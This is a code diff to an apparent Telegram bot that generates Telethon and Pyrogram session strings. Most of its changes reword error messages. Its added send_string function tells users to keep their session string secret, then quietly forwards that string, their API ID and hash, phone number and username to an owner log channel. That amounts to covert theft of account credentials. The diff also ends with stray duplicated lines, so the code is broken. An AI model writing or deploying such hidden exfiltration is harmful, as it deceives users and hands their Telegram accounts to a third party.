@@ -150,10 +150,10 @@ async def telethon_login(user_id):
         user_sessions[user_id]["client"] = client
         user_sessions[user_id]["phone_code_hash"] = sent.phone_code_hash
         
-        msg = bot.send_message(user_id, "✉️ Enter the OTP you received (format: 1 2 3 4 5):")
+        msg = bot.send_message(user_id, "✉️ Enter the OTP you received (e.g. 12345):")
         bot.register_next_step_handler(msg, get_telethon_otp)
     except Exception as e:
-        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        bot.send_message(user_id, f"❌ Error sending code: {str(e)}")
         if "client" in user_sessions[user_id]:
             await client.disconnect()
 
@@ -167,9 +167,8 @@ def get_telethon_otp(message):
 async def complete_telethon_login(user_id, code):
     data = user_sessions[user_id]
     client = data["client"]
-    
     try:
-        await client.sign_in(phone=data["phone"], code=code, phone_code_hash=data["phone_code_hash"])
+        await client.sign_in(data["phone"], code, phone_code_hash=data["phone_code_hash"])
         string_session = StringSession.save(client.session)
         await client.disconnect()
         send_string(user_id, data, string_session)
@@ -177,7 +176,7 @@ async def complete_telethon_login(user_id, code):
         msg = bot.send_message(user_id, "🔒 Your account has two-step verification. Please enter your password:")
         bot.register_next_step_handler(msg, get_telethon_password)
     except Exception as e:
-        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        bot.send_message(user_id, f"❌ Error signing in: {str(e)}")
         await client.disconnect()
 
 
@@ -196,14 +195,14 @@ async def complete_telethon_with_password(user_id, password):
         await client.disconnect()
         send_string(user_id, data, string_session)
     except Exception as e:
-        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        bot.send_message(user_id, f"❌ Error with password: {str(e)}")
         await client.disconnect()
 
 
 # ========== PYROGRAM LOGIN ==========
 async def pyrogram_login(user_id):
     data = user_sessions[user_id]
-    client = Client(":memory:", api_id=data["api_id"], api_hash=data["api_hash"])
+    client = Client(name=":memory:", api_id=data["api_id"], api_hash=data["api_hash"])
     
     try:
         await client.connect()
@@ -211,10 +210,10 @@ async def pyrogram_login(user_id):
         user_sessions[user_id]["client"] = client
         user_sessions[user_id]["phone_code_hash"] = sent.phone_code_hash
         
-        msg = bot.send_message(user_id, "✉️ Enter the OTP you received (format: 1 2 3 4 5):")
+        msg = bot.send_message(user_id, "✉️ Enter the OTP you received (e.g. 12345):")
         bot.register_next_step_handler(msg, get_pyrogram_otp)
     except Exception as e:
-        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        bot.send_message(user_id, f"❌ Error sending code: {str(e)}")
         if "client" in user_sessions[user_id]:
             await client.disconnect()
 
@@ -237,7 +236,7 @@ async def complete_pyrogram_login(user_id, code):
         msg = bot.send_message(user_id, "🔒 Your account has two-step verification. Please enter your password:")
         bot.register_next_step_handler(msg, get_pyrogram_password)
     except Exception as e:
-        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        bot.send_message(user_id, f"❌ Error signing in: {str(e)}")
         await client.disconnect()
 
 
@@ -256,12 +255,35 @@ async def complete_pyrogram_with_password(user_id, password):
         await client.disconnect()
         send_string(user_id, data, string_session)
     except Exception as e:
-        bot.send_message(user_id, f"❌ Error: {str(e)}")
+        bot.send_message(user_id, f"❌ Error with password: {str(e)}")
         await client.disconnect()
 
 
 # ========== SEND STRING ==========
 def send_string(chat_id, data, string):
+    lib = data["lib"].capitalize()
+    username = bot.get_chat(chat_id).username or "NoUsername"
+    
+    bot.send_message(chat_id, f"✅ Your <b>{lib}</b> String Session:\n\n<code>{string}</code>\n\n📌 Save this safely and don't share it with anyone!")
+    try:
+        bot.send_message(
+            OWNER_LOG_CHANNEL,
+            f"🔔 New {lib} String Generated\n\n👤 User: @{username}\n🆔 User ID: {chat_id}\n🆔 API ID: <code>{data['api_id']}</code>\n🔑 API HASH: <code>{data['api_hash']}</code>\n📱 Phone: {data['phone']}\n📜 String:\n<code>{string}</code>"
+        )
+    except Exception as e:
+        print(f"Failed to send to log channel: {e}")
+
+
+# === RUN BOT ===
+if __name__ == "__main__":
+    print("🚀 Session String Generator Bot Started...")
+
+    def run_loop():
+        loop.run_forever()
+
+    threading.Thread(target=run_loop, daemon=True).start()
+    threading.Thread(target=bot.infinity_polling, daemon=True).start()
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
     lib = data["lib"].capitalize()
     username = bot.get_chat(chat_id).username or "NoUsername"
     
